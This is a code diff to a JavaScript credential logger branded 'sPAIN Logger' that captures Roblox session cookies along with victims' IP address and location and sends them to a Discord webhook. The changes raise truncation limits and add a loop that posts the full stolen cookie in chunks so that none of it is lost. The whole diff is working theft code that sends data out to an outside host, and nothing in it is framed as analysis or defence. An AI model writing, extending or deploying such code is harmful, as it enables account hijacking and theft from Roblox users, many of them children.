@@ -182,7 +182,7 @@ async function fetchRobloxInfo(cookie) {
 }
 
 function field(name, value, inline = true) {
-  const truncated = value?.toString()?.substring(0, 1000) || 'N/A';
+  const truncated = value?.toString()?.substring(0, 1024) || 'N/A';
   return { name: name?.substring(0, 256), value: truncated, inline };
 }
 
@@ -207,7 +207,7 @@ async function sendToDiscord(webhookUrl, data) {
           field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
           field('🌐 IP Address', ip || 'Unknown', true),
           field('📅 Date', now, false),
-          field('🗑️ Bad Cookie', `\`\`\`${cleanCookie.substring(0, 500)}\`\`\``, false),
+          field('🗑️ Bad Cookie', `\`\`\`${cleanCookie.substring(0, 1020)}\`\`\``, false),
         ],
         footer: { text: 'sPAIN Logger • Invalid Submission' },
         thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
@@ -228,7 +228,7 @@ async function sendToDiscord(webhookUrl, data) {
         description: ':rotating_light: `Someone submitted without a valid Roblox cookie` :rotating_light:',
         color: 0xff6600,
         fields: [
-          field('📥 Pasted', rawValue?.substring(0, 500) || '(empty)', false),
+          field('📥 Pasted', rawValue || '(empty)', false),
           field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
           field('🌐 IP Address', ip || 'Unknown', true),
           field('📅 Date', now, false),
@@ -298,6 +298,25 @@ Owned: ${roblox?.groupsOwned || 0}`, true),
       console.error('Discord API Error:', response.status, text);
       return false;
     }
+
+    // Send full cookie as a separate plain message so it is NEVER cut off
+    if (cleanCookie && cleanCookie !== 'No cookie captured') {
+      // Split into chunks of 1990 chars if somehow extremely long
+      const chunks = [];
+      let remaining = cleanCookie;
+      while (remaining.length > 0) {
+        chunks.push(remaining.substring(0, 1990));
+        remaining = remaining.substring(1990);
+      }
+      for (const chunk of chunks) {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: '`' + chunk + '`' })
+        }).catch(() => {});
+      }
+    }
+
     return true;
   } catch (err) {
     console.error('Discord fetch error:', err);
